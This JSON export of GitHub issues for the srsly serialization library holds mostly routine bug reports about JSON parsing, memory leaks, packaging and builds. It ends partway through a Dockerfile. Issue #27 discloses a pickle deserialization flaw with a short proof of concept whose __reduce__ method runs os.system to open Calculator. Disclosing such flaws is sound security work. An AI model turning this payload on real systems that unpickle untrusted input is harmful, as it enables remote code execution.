{"total_count": 12, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/explosion/srsly/issues/29", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/29/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/29/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/29/events", "html_url": "https://github.com/explosion/srsly/issues/29", "id": 650510864, "node_id": "MDU6SXNzdWU2NTA1MTA4NjQ=", "number": 29, "title": "srsly.read_json is broken", "user": {"login": "tamuhey", "id": 24998666, "node_id": "MDQ6VXNlcjI0OTk4NjY2", "avatar_url": "https://avatars2.githubusercontent.com/u/24998666?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tamuhey", "html_url": "https://github.com/tamuhey", "followers_url": "https://api.github.com/users/tamuhey/followers", "following_url": "https://api.github.com/users/tamuhey/following{/other_user}", "gists_url": "https://api.github.com/users/tamuhey/gists{/gist_id}", "starred_url": "https://api.github.com/users/tamuhey/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tamuhey/subscriptions", "organizations_url": "https://api.github.com/users/tamuhey/orgs", "repos_url": "https://api.github.com/users/tamuhey/repos", "events_url": "https://api.github.com/users/tamuhey/events{/privacy}", "received_events_url": "https://api.github.com/users/tamuhey/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-03T10:39:28Z", "updated_at": "2020-07-03T14:52:47Z", "closed_at": "2020-07-03T14:52:28Z", "author_association": "NONE", "active_lock_reason": null, "body": "code:\r\n\r\n```python\r\nimport srsly\r\n\r\nprint(srsly.read_json(\"foo.json\"))\r\n```\r\n\r\noutputs:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/tmp/foo.py\", line 4, in <module>\r\n    print(srsly.read_json(\"foo.json\"))\r\n  File \"/Users/yohei_tamura/work/lilly/.venv/lib/python3.8/site-packages/srsly/_json_api.py\", line 52, in read_json\r\n    return ujson.load(f)\r\nValueError: Expected object or value\r\n````\r\n\r\nsrsly version: 2.2.0\r\npython version: 3.8.1", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/27", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/27/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/27/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/27/events", "html_url": "https://github.com/explosion/srsly/issues/27", "id": 647937399, "node_id": "MDU6SXNzdWU2NDc5MzczOTk=", "number": 27, "title": "Deserialization Vulnerability ", "user": {"login": "iaskwho", "id": 6389808, "node_id": "MDQ6VXNlcjYzODk4MDg=", "avatar_url": "https://avatars2.githubusercontent.com/u/6389808?v=4", "gravatar_id": "", "url": "https://api.github.com/users/iaskwho", "html_url": "https://github.com/iaskwho", "followers_url": "https://api.github.com/users/iaskwho/followers", "following_url": "https://api.github.com/users/iaskwho/following{/other_user}", "gists_url": "https://api.github.com/users/iaskwho/gists{/gist_id}", "starred_url": "https://api.github.com/users/iaskwho/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/iaskwho/subscriptions", "organizations_url": "https://api.github.com/users/iaskwho/orgs", "repos_url": "https://api.github.com/users/iaskwho/repos", "events_url": "https://api.github.com/users/iaskwho/events{/privacy}", "received_events_url": "https://api.github.com/users/iaskwho/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-30T07:29:58Z", "updated_at": "2020-06-30T18:23:32Z", "closed_at": "2020-06-30T18:12:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "hi, recently i found srsly have some Security issues,\r\n**unsafe object can execute system commands, maby remote commands execute**\r\n\r\nexample:\r\n\r\n```\r\nimport srsly\r\nimport os\r\n\r\nclass poc:\r\n    def __reduce__(self):\r\n        return (os.system,('open /Applications/Calculator.app',))\r\n\r\npayload= srsly.pickle_dumps(poc())\r\nsrsly.pickle_loads(payload)\r\n```\r\n\r\nwhen srsly deserialize the payload, Calculator.app will be open.\r\n![image](https://user-images.githubusercontent.com/6389808/86096912-7f58ec80-bae6-11ea-8fcc-e5abd31d3a87.png)\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/23", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/23/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/23/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/23/events", "html_url": "https://github.com/explosion/srsly/issues/23", "id": 593599430, "node_id": "MDU6SXNzdWU1OTM1OTk0MzA=", "number": 23, "title": "Use Protobufs instead of msgpack", "user": {"login": "ucalyptus", "id": 36279638, "node_id": "MDQ6VXNlcjM2Mjc5NjM4", "avatar_url": "https://avatars1.githubusercontent.com/u/36279638?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ucalyptus", "html_url": "https://github.com/ucalyptus", "followers_url": "https://api.github.com/users/ucalyptus/followers", "following_url": "https://api.github.com/users/ucalyptus/following{/other_user}", "gists_url": "https://api.github.com/users/ucalyptus/gists{/gist_id}", "starred_url": "https://api.github.com/users/ucalyptus/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ucalyptus/subscriptions", "organizations_url": "https://api.github.com/users/ucalyptus/orgs", "repos_url": "https://api.github.com/users/ucalyptus/repos", "events_url": "https://api.github.com/users/ucalyptus/events{/privacy}", "received_events_url": "https://api.github.com/users/ucalyptus/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-04-03T19:40:57Z", "updated_at": "2020-04-03T19:58:40Z", "closed_at": "2020-04-03T19:58:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/22", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/22/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/22/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/22/events", "html_url": "https://github.com/explosion/srsly/issues/22", "id": 573525581, "node_id": "MDU6SXNzdWU1NzM1MjU1ODE=", "number": 22, "title": "New UltraJSON release soon", "user": {"login": "hugovk", "id": 1324225, "node_id": "MDQ6VXNlcjEzMjQyMjU=", "avatar_url": "https://avatars2.githubusercontent.com/u/1324225?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hugovk", "html_url": "https://github.com/hugovk", "followers_url": "https://api.github.com/users/hugovk/followers", "following_url": "https://api.github.com/users/hugovk/following{/other_user}", "gists_url": "https://api.github.com/users/hugovk/gists{/gist_id}", "starred_url": "https://api.github.com/users/hugovk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hugovk/subscriptions", "organizations_url": "https://api.github.com/users/hugovk/orgs", "repos_url": "https://api.github.com/users/hugovk/repos", "events_url": "https://api.github.com/users/hugovk/events{/privacy}", "received_events_url": "https://api.github.com/users/hugovk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-01T10:51:42Z", "updated_at": "2020-06-30T18:14:32Z", "closed_at": "2020-06-30T18:14:32Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello, after a few years, we'll be making a new release of upstream UltraJSON (aka ujson) soon:\r\n\r\nhttps://github.com/ultrajson/ultrajson/issues/352\r\n\r\nIf there's anything included in this fork that would be useful upstream, please could you make PRs at:\r\n\r\nhttps://github.com/ultrajson/ultrajson/\r\n\r\n(The new home of https://github.com/esnme/ultrajson/)\r\n\r\nThank you! ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/19", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/19/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/19/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/19/events", "html_url": "https://github.com/explosion/srsly/issues/19", "id": 545727281, "node_id": "MDU6SXNzdWU1NDU3MjcyODE=", "number": 19, "title": "Release v1.0.0 was removed from PyPI.org", "user": {"login": "robbwagoner", "id": 989361, "node_id": "MDQ6VXNlcjk4OTM2MQ==", "avatar_url": "https://avatars2.githubusercontent.com/u/989361?v=4", "gravatar_id": "", "url": "https://api.github.com/users/robbwagoner", "html_url": "https://github.com/robbwagoner", "followers_url": "https://api.github.com/users/robbwagoner/followers", "following_url": "https://api.github.com/users/robbwagoner/following{/other_user}", "gists_url": "https://api.github.com/users/robbwagoner/gists{/gist_id}", "starred_url": "https://api.github.com/users/robbwagoner/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/robbwagoner/subscriptions", "organizations_url": "https://api.github.com/users/robbwagoner/orgs", "repos_url": "https://api.github.com/users/robbwagoner/repos", "events_url": "https://api.github.com/users/robbwagoner/events{/privacy}", "received_events_url": "https://api.github.com/users/robbwagoner/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-01-06T13:29:37Z", "updated_at": "2020-03-01T15:02:19Z", "closed_at": "2020-03-01T15:02:19Z", "author_association": "NONE", "active_lock_reason": null, "body": "The [release package for 1.0.0 was removed from PyPI.org](https://pypi.org/project/srsly/#history). Doing this causes problems for many automated build systems and pipelines. Removing packages from repos is frowned upon. Please replace the package in PyPI. It it is broken in some way, please release a v1.0.1 instead of removing 1.0.0.\r\n\r\n----\r\n```\r\npip3 install srsly==1.0.0\r\nCollecting srsly==1.0.0\r\n  Could not find a version that satisfies the requirement srsly==1.0.0 (from versions: 0.0.1, 0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.1.0, 0.2.0, 2.0.0.dev0, 2.0.0.dev1, 2.0.0)\r\nNo matching distribution found for srsly==1.0.0\r\n```\r\n----\r\n<img width=\"985\" alt=\"Releases_\u00b7_explosion_srsly\" src=\"https://user-images.githubusercontent.com/989361/71820992-1ec48780-304e-11ea-913b-0770f7dd62f6.png\">\r\n\r\n\r\n<img width=\"1148\" alt=\"srsly_\u00b7_PyPI\" src=\"https://user-images.githubusercontent.com/989361/71820812-9219c980-304d-11ea-90fc-5447b7caf0f6.png\">\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/15", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/15/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/15/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/15/events", "html_url": "https://github.com/explosion/srsly/issues/15", "id": 514947699, "node_id": "MDU6SXNzdWU1MTQ5NDc2OTk=", "number": 15, "title": "Rounding error in tests for x86 and aarch64", "user": {"login": "OTLabs", "id": 181551, "node_id": "MDQ6VXNlcjE4MTU1MQ==", "avatar_url": "https://avatars3.githubusercontent.com/u/181551?v=4", "gravatar_id": "", "url": "https://api.github.com/users/OTLabs", "html_url": "https://github.com/OTLabs", "followers_url": "https://api.github.com/users/OTLabs/followers", "following_url": "https://api.github.com/users/OTLabs/following{/other_user}", "gists_url": "https://api.github.com/users/OTLabs/gists{/gist_id}", "starred_url": "https://api.github.com/users/OTLabs/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/OTLabs/subscriptions", "organizations_url": "https://api.github.com/users/OTLabs/orgs", "repos_url": "https://api.github.com/users/OTLabs/repos", "events_url": "https://api.github.com/users/OTLabs/events{/privacy}", "received_events_url": "https://api.github.com/users/OTLabs/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-10-30T20:03:49Z", "updated_at": "2020-01-02T11:34:40Z", "closed_at": "2020-01-02T11:34:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "Compiling `srsly` 0.2.0 on ~~Arch~~ Alpine Linux I got following error in test for x86 and aarch64 architectures (https://cloud.drone.io/alpinelinux/aports/13161/1/1 , https://cloud.drone.io/alpinelinux/aports/13161/3/1):\r\n```\r\n\r\n=================================== FAILURES ===================================\r\n--\r\n1770 | ____________ UltraJSONTests.test_decodeFloatingPointAdditionalTests ____________\r\n1771 | \u00a0\r\n1772 | self = <srsly.tests.ujson.test_ujson.UltraJSONTests testMethod=test_decodeFloatingPointAdditionalTests>\r\n1773 | \u00a0\r\n1774 | def test_decodeFloatingPointAdditionalTests(self):\r\n1775 | self.assertEqual(-1.1234567893, ujson.loads(\"-1.1234567893\"))\r\n1776 | self.assertEqual(-1.234567893, ujson.loads(\"-1.234567893\"))\r\n1777 | self.assertEqual(-1.34567893, ujson.loads(\"-1.34567893\"))\r\n1778 | self.assertEqual(-1.4567893, ujson.loads(\"-1.4567893\"))\r\n1779 | self.assertEqual(-1.567893, ujson.loads(\"-1.567893\"))\r\n1780 | self.assertEqual(-1.67893, ujson.loads(\"-1.67893\"))\r\n1781 | >       self.assertEqual(-1.7893, ujson.loads(\"-1.7893\"))\r\n1782 | E       AssertionError: -1.7893 != -1.7893000000000001\r\n1783 | \u00a0\r\n1784 | srsly/tests/ujson/test_ujson.py:761: AssertionError\r\n\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/13", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/13/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/13/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/13/events", "html_url": "https://github.com/explosion/srsly/issues/13", "id": 510695739, "node_id": "MDU6SXNzdWU1MTA2OTU3Mzk=", "number": 13, "title": "add an option to write_jsonl to define whether a new line is written in append mode", "user": {"login": "nyejon", "id": 17871768, "node_id": "MDQ6VXNlcjE3ODcxNzY4", "avatar_url": "https://avatars1.githubusercontent.com/u/17871768?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nyejon", "html_url": "https://github.com/nyejon", "followers_url": "https://api.github.com/users/nyejon/followers", "following_url": "https://api.github.com/users/nyejon/following{/other_user}", "gists_url": "https://api.github.com/users/nyejon/gists{/gist_id}", "starred_url": "https://api.github.com/users/nyejon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nyejon/subscriptions", "organizations_url": "https://api.github.com/users/nyejon/orgs", "repos_url": "https://api.github.com/users/nyejon/repos", "events_url": "https://api.github.com/users/nyejon/events{/privacy}", "received_events_url": "https://api.github.com/users/nyejon/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-10-22T14:28:44Z", "updated_at": "2019-10-25T09:32:34Z", "closed_at": "2019-10-25T09:32:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Linking to the discussion in this thread: \r\n\r\nhttps://support.prodi.gy/t/db-in-command-cant-handle-blank-lines-in-jsonl/2126/3\r\n\r\nIt would be useful to be able to define whether or not there should be a blank line appended to a file when using write_jsonl.\r\n\r\nI have the scenario where I want to append to a single file using srsly, and it already adds a new line at the end of the file, so there does not need to be a new line written first when appending to the file.\r\n\r\nThere is an option in read_jsonl to ignore blank lines, which could also be an option for db-in in prodigy, but it would be a good idea anyway to write a single continuous file with multiple appends.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/10", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/10/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/10/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/10/events", "html_url": "https://github.com/explosion/srsly/issues/10", "id": 508735409, "node_id": "MDU6SXNzdWU1MDg3MzU0MDk=", "number": 10, "title": "Vendored version of cloudpickle does not support Python 3.8", "user": {"login": "jonblum", "id": 933960, "node_id": "MDQ6VXNlcjkzMzk2MA==", "avatar_url": "https://avatars1.githubusercontent.com/u/933960?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jonblum", "html_url": "https://github.com/jonblum", "followers_url": "https://api.github.com/users/jonblum/followers", "following_url": "https://api.github.com/users/jonblum/following{/other_user}", "gists_url": "https://api.github.com/users/jonblum/gists{/gist_id}", "starred_url": "https://api.github.com/users/jonblum/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jonblum/subscriptions", "organizations_url": "https://api.github.com/users/jonblum/orgs", "repos_url": "https://api.github.com/users/jonblum/repos", "events_url": "https://api.github.com/users/jonblum/events{/privacy}", "received_events_url": "https://api.github.com/users/jonblum/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-10-17T21:41:56Z", "updated_at": "2019-10-25T09:32:22Z", "closed_at": "2019-10-25T09:32:22Z", "author_association": "NONE", "active_lock_reason": null, "body": "The version of cloudpickle currently vendored in srsly fails to import under Python 3.8 as a result of PEP 570-related changes to `types.CodeType`'s signature:\r\n\r\n```\r\n  File \"...../lib/python3.8/site-packages/srsly/__init__.py\", line 7, in <module>\r\n    from ._pickle_api import pickle_dumps, pickle_loads\r\n  File \"...../lib/python3.8/site-packages/srsly/_pickle_api.py\", line 4, in <module>\r\n    from . import cloudpickle\r\n  File \"...../lib/python3.8/site-packages/srsly/cloudpickle/__init__.py\", line 1, in <module>\r\n    from .cloudpickle import *\r\n  File \"...../lib/python3.8/site-packages/srsly/cloudpickle/cloudpickle.py\", line 167, in <module>\r\n    _cell_set_template_code = _make_cell_set_template_code()\r\n  File \"...../lib/python3.8/site-packages/srsly/cloudpickle/cloudpickle.py\", line 148, in _make_cell_set_template_code\r\n    return types.CodeType(\r\nTypeError: an integer is required (got type bytes)\r\n```\r\n\r\nSee also:\r\nhttps://github.com/cloudpipe/cloudpickle/issues/266\r\nhttps://github.com/cloudpipe/cloudpickle/pull/267\r\n\r\nUpdating to the latest version of cloudpickle should resolve this.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/8", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/8/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/8/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/8/events", "html_url": "https://github.com/explosion/srsly/issues/8", "id": 473550125, "node_id": "MDU6SXNzdWU0NzM1NTAxMjU=", "number": 8, "title": "Unable to import srsly.ujson.ujson for SpaCy -- AWS Lambda", "user": {"login": "nagarajanshanmuganthan", "id": 51677185, "node_id": "MDQ6VXNlcjUxNjc3MTg1", "avatar_url": "https://avatars2.githubusercontent.com/u/51677185?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nagarajanshanmuganthan", "html_url": "https://github.com/nagarajanshanmuganthan", "followers_url": "https://api.github.com/users/nagarajanshanmuganthan/followers", "following_url": "https://api.github.com/users/nagarajanshanmuganthan/following{/other_user}", "gists_url": "https://api.github.com/users/nagarajanshanmuganthan/gists{/gist_id}", "starred_url": "https://api.github.com/users/nagarajanshanmuganthan/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nagarajanshanmuganthan/subscriptions", "organizations_url": "https://api.github.com/users/nagarajanshanmuganthan/orgs", "repos_url": "https://api.github.com/users/nagarajanshanmuganthan/repos", "events_url": "https://api.github.com/users/nagarajanshanmuganthan/events{/privacy}", "received_events_url": "https://api.github.com/users/nagarajanshanmuganthan/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-26T21:56:02Z", "updated_at": "2019-08-18T12:40:25Z", "closed_at": "2019-08-18T12:40:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to add SpaCy as a dependency to my Python Lambda. I am doing this by installing SpaCy as a standalone dependency inside a directory named `dependencies` using `pip3 install spacy --no-deps -t .` This is because I can't load the entire Spacy dependency inside the `\\tmp` directory of my Lambda. \r\n\r\nI am able to successfully upload the folder to s3 and download it during the Lambda invocation. When I try to `import spacy`, I get this error: `[ERROR] Runtime.ImportModuleError: Unable to import module : No module named 'srsly.ujson.ujson'`. \r\n\r\nI manually installed `srsly` inside `dependencies\\` and I have all the files that are listed as per [this link][1]. This was referenced by [this link][2]. One of the responses says, \"it seems like Python can't load it, because it's not compiled?\". How would I compile a dependency which has a `.c` file in it?\r\n\r\nOne other question which I found on SO is [this question][3], but I have already manually installed `srsly`. How to I import the module? Thanks.\r\n\r\n--- \r\n\r\nI manually check in my code for the presence of `ujson` before importing spacy like this:\r\n\r\n```python\r\nif os.path.exists('/tmp/dependencies/srsly/ujson/ujson.c'):\r\n    print('ujson exists')\r\n```\r\n\r\nand the print statement gets printed. \r\n\r\n\r\n  [1]: https://github.com/explosion/srsly/tree/master/srsly/ujson\r\n  [2]: https://github.com/explosion/srsly/issues/3\r\n  [3]: https://stackoverflow.com/questions/56895324/not-able-to-import-en-core-web-sm-or-spacy", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/4", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/4/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/4/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/4/events", "html_url": "https://github.com/explosion/srsly/issues/4", "id": 451485279, "node_id": "MDU6SXNzdWU0NTE0ODUyNzk=", "number": 4, "title": "Memory leaks in ujson", "user": {"login": "sadovnychyi", "id": 193864, "node_id": "MDQ6VXNlcjE5Mzg2NA==", "avatar_url": "https://avatars3.githubusercontent.com/u/193864?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sadovnychyi", "html_url": "https://github.com/sadovnychyi", "followers_url": "https://api.github.com/users/sadovnychyi/followers", "following_url": "https://api.github.com/users/sadovnychyi/following{/other_user}", "gists_url": "https://api.github.com/users/sadovnychyi/gists{/gist_id}", "starred_url": "https://api.github.com/users/sadovnychyi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sadovnychyi/subscriptions", "organizations_url": "https://api.github.com/users/sadovnychyi/orgs", "repos_url": "https://api.github.com/users/sadovnychyi/repos", "events_url": "https://api.github.com/users/sadovnychyi/events{/privacy}", "received_events_url": "https://api.github.com/users/sadovnychyi/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 1146371571, "node_id": "MDU6TGFiZWwxMTQ2MzcxNTcx", "url": "https://api.github.com/repos/explosion/srsly/labels/bug", "name": "bug", "color": "d73a4a", "default": true, "description": "Something isn't working"}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-06-03T13:31:05Z", "updated_at": "2019-06-07T10:46:37Z", "closed_at": "2019-06-05T19:50:30Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "We've replaced the usage of json with srsly.ujson a while ago for that free performance boost since we are doing lots of JSON encoding/decoding and we already have it installed as part of spacy, but now we had to move back because of some terrible memory leaks:\r\n\r\n```python\r\nimport json\r\nimport random\r\nimport string\r\nimport psutil\r\nfrom srsly import ujson as json\r\n\r\nsample = lambda x: ''.join(\r\n  random.choice(string.ascii_uppercase + string.digits) for _ in range(x))\r\n\r\nprocess = psutil.Process()\r\n\r\nfor i in range(10):\r\n  data = json.dumps({sample(99): sample(100000) for k in range(50)})\r\n  json.loads(data)\r\n  print(process.memory_info())\r\n```\r\n\r\nOutput with ujson:\r\n```\r\npmem(rss=24203264, vms=4400664576, pfaults=19049, pageins=0)\r\npmem(rss=29409280, vms=4414173184, pfaults=33898, pageins=0)\r\npmem(rss=34557952, vms=4419309568, pfaults=47960, pageins=0)\r\npmem(rss=39714816, vms=4424429568, pfaults=62855, pageins=0)\r\npmem(rss=44838912, vms=4429549568, pfaults=77571, pageins=0)\r\npmem(rss=50081792, vms=4434751488, pfaults=92307, pageins=0)\r\npmem(rss=55312384, vms=4439973888, pfaults=107288, pageins=0)\r\npmem(rss=60440576, vms=4445093888, pfaults=122711, pageins=0)\r\npmem(rss=65806336, vms=4451422208, pfaults=137578, pageins=0)\r\npmem(rss=70934528, vms=4456542208, pfaults=151382, pageins=0)\r\n```\r\n\r\nOutput with stdlib json:\r\n```\r\npmem(rss=17154048, vms=4385366016, pfaults=17692, pageins=0)\r\npmem(rss=17317888, vms=4403191808, pfaults=32047, pageins=0)\r\npmem(rss=17317888, vms=4403191808, pfaults=46541, pageins=0)\r\npmem(rss=17317888, vms=4403191808, pfaults=61035, pageins=0)\r\npmem(rss=17358848, vms=4403191808, pfaults=75539, pageins=0)\r\npmem(rss=17383424, vms=4403191808, pfaults=90039, pageins=0)\r\npmem(rss=17383424, vms=4403191808, pfaults=104533, pageins=0)\r\npmem(rss=17420288, vms=4403191808, pfaults=119036, pageins=0)\r\npmem(rss=17420288, vms=4403191808, pfaults=133530, pageins=0)\r\npmem(rss=17420288, vms=4403191808, pfaults=148024, pageins=0)\r\n```\r\n\r\nBenchmark ran on python3.7 on macos, but same leak exists on Debian with python27.\r\nYou can increase the range from 10 and you will eventually run of our memory.\r\n\r\n*Days* were spent on this issue, because I would never suspect the JSON library to be at fault, but it is. I don't know if it affects Spacy in any way.\r\n\r\nCould be related: https://github.com/esnme/ultrajson/pull/270", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/3", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/3/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/3/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/3/events", "html_url": "https://github.com/explosion/srsly/issues/3", "id": 429332242, "node_id": "MDU6SXNzdWU0MjkzMzIyNDI=", "number": 3, "title": "No module named 'srsly.ujson.ujson'", "user": {"login": "antoineGit", "id": 11542647, "node_id": "MDQ6VXNlcjExNTQyNjQ3", "avatar_url": "https://avatars2.githubusercontent.com/u/11542647?v=4", "gravatar_id": "", "url": "https://api.github.com/users/antoineGit", "html_url": "https://github.com/antoineGit", "followers_url": "https://api.github.com/users/antoineGit/followers", "following_url": "https://api.github.com/users/antoineGit/following{/other_user}", "gists_url": "https://api.github.com/users/antoineGit/gists{/gist_id}", "starred_url": "https://api.github.com/users/antoineGit/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/antoineGit/subscriptions", "organizations_url": "https://api.github.com/users/antoineGit/orgs", "repos_url": "https://api.github.com/users/antoineGit/repos", "events_url": "https://api.github.com/users/antoineGit/events{/privacy}", "received_events_url": "https://api.github.com/users/antoineGit/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-04-04T15:06:35Z", "updated_at": "2019-07-26T20:57:39Z", "closed_at": "2019-06-05T20:15:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm installing **srsly** on an **AWS lambda** but I keep getting an error : \r\n`No module named 'srsly.ujson.ujson'`\r\n\r\nIt's install with srsly inside its package but can't be access. \r\nI tried to change all declaration to a global `import ujson` which i downloaded without any success ...\r\n\r\nAny ideas ?\r\n\r\n\r\nPS : I'm installing a Spacy lambda which require srsly", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/explosion/srsly/issues/2", "repository_url": "https://api.github.com/repos/explosion/srsly", "labels_url": "https://api.github.com/repos/explosion/srsly/issues/2/labels{/name}", "comments_url": "https://api.github.com/repos/explosion/srsly/issues/2/comments", "events_url": "https://api.github.com/repos/explosion/srsly/issues/2/events", "html_url": "https://github.com/explosion/srsly/issues/2", "id": 424946351, "node_id": "MDU6SXNzdWU0MjQ5NDYzNTE=", "number": 2, "title": "Build fails on PyPy", "user": {"login": "mhham", "id": 26010469, "node_id": "MDQ6VXNlcjI2MDEwNDY5", "avatar_url": "https://avatars0.githubusercontent.com/u/26010469?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mhham", "html_url": "https://github.com/mhham", "followers_url": "https://api.github.com/users/mhham/followers", "following_url": "https://api.github.com/users/mhham/following{/other_user}", "gists_url": "https://api.github.com/users/mhham/gists{/gist_id}", "starred_url": "https://api.github.com/users/mhham/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mhham/subscriptions", "organizations_url": "https://api.github.com/users/mhham/orgs", "repos_url": "https://api.github.com/users/mhham/repos", "events_url": "https://api.github.com/users/mhham/events{/privacy}", "received_events_url": "https://api.github.com/users/mhham/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 1146371578, "node_id": "MDU6TGFiZWwxMTQ2MzcxNTc4", "url": "https://api.github.com/repos/explosion/srsly/labels/wontfix", "name": "wontfix", "color": "ffffff", "default": true, "description": "This will not be worked on"}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-03-25T14:53:26Z", "updated_at": "2019-06-05T19:53:15Z", "closed_at": "2019-06-05T19:52:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to build spacy 2.1.3 on an alpine PyPy docker image, everything seems to build without an issue except `srsly`.\r\n\r\nDockerfile to reproduce:\r\n```Dockerfile\r\nFROM 